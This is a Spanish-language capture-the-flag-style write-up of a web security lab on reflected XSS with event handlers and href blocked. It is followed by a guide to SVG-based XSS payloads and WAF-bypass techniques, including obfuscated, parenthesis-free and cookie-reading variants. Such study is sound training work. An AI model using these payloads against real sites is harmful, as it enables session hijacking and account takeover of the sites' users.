Lab: Reflected XSS with event handlers and href attributes blocked


This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor `href` attributes are blocked.

To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the `alert` function.

Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:

```html
<a href="">Click me</a>
```
---


Como se trata de un contexto HTML entre etiquetas, sabemos que el parámetro de búsqueda refleja el payload que se le inyecte:
![image](https://github.com/user-attachments/assets/6d1bb63e-6238-4146-b8b0-6707ef8d6611)

Tembién sabemos que tenemos un waf que bloquea la mayoría de las etiquetas:
![image](https://github.com/user-attachments/assets/d34ec8c0-b27e-4ab5-8fb0-203c84c0e680)

Por lo que dice el ejercicio, el waf tiene una lista blanca de etiquetas, entre las cuales, está permitida al etiqueta `<a>`:
![image](https://github.com/user-attachments/assets/f274c733-f853-4e80-b3f3-0bb47a9f0cec)

Sin embargo si queremos inyectar la siguiente etiqueta:
```html
<a href="javascript:alert(1)">Click me</a>
```
Vemos que el atributo `href` está bloqueado:
![image](https://github.com/user-attachments/assets/9887dbca-5f68-4839-9f95-cfb9a2fc68f9)

Procedemos a realizar un Sniper Attack con Burpsuite Intruder para averiguar las tags permitidas:
![image](https://github.com/user-attachments/assets/851d9069-0f80-4489-8130-653c29d5a86a)

Hay que tener especial atención al `<svg>`, ya que:

- Es comúnmente usado en ataques XSS modernos.

- Se puede usar junto con eventos como `onload`, por ejemplo:
  ```html
  <svg onload="alert(1)">
  ```
Probamos el payload pero vemos que el atributo onload es bloqueado:
![image](https://github.com/user-attachments/assets/776bb23a-6f73-4202-9568-c9593f3dd206)


---

# 🧠 Guía Completa de XSS usando `<svg>`

## 🧩 ¿Por qué `<svg>` es útil para XSS?

`<svg>` es una etiqueta válida de HTML5 usada para gráficos vectoriales.  
Lo interesante es que el navegador la permite aunque el WAF (Firewall) bloquee etiquetas clásicas como `<script>`, `<img>`, etc.

Además, **dentro de un `<svg>` podés insertar eventos de JavaScript**, como `onload`, `onmouseover`, etc., lo que la hace una excelente herramienta para bypass.

---

## 🧪 Casos básicos de XSS con `<svg>`

### 1. 🧨 Payload mínimo funcional:

```html
<svg onload=alert(1)>
```

- `onload`: se ejecuta apenas el navegador carga el SVG.

---

### 2. 🔥 Payload dentro de una URL (reflected XSS):

```url
?search=<svg%20onload=alert(1)>
```

- `%20` es espacio, el navegador lo decodifica al mostrarlo.

---

### 3. 🛠️ Payload más elaborado con atributos adicionales:

```html
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
```

- `xmlns`: hace que el SVG sea completamente válido.
- `document.domain`: otra forma de probar que se ejecuta JS.

---

## 💡 ¿Qué eventos podés usar?

- `onload` ✅ → apenas se carga.
- `onmouseover` ✅ → cuando pasás el mouse.
- `onfocus` ✅ → cuando hacés foco (útil con `tabindex`).
- `onclick` ✅ → cuando hacés click.

```html
<svg onclick=alert(1)>Click me</svg>
```

---

## 🎯 Casos reales de bypass con `<svg>`

### ✅ Bypass cuando `<script>` está bloqueado:

```html
<svg/onload=alert(1)>
```

### ✅ Payload sin paréntesis:

```html
<svg onload=confirm`${document.cookie}`>
```

### ✅ Payload ofuscado:

```html
<svg %0Aonload=alert(1)>
```

---

## 💡 Pro Tips

| Caso | Técnica |
|------|---------|
| WAF bloquea `<script>` | Usá `<svg onload=...>` |
| WAF bloquea paréntesis | Usá template strings: \`${...}\` |
| WAF bloquea `"`, `'` | Usá backticks o sin comillas |
| Quieren que se dispare solo | `onload` o `autofocus + #hash` |

---

## 🧪 Práctica rápida

```url
?search=<svg%20onload=alert(document.domain)>
```

```url
?search=<svg%20id=x%20onfocus=alert(1)%20tabindex=1>#x
```

---

## 🧱 Si tenés un WAF muy fuerte...

```html
<svg><script>alert(1)</script></svg>
```

```html
<svg><a xlink:href="javascript:alert(1)">CLICK</a></svg>
```

> Ojo: no todos los navegadores modernos permiten `javascript:` dentro de SVGs hoy.

---



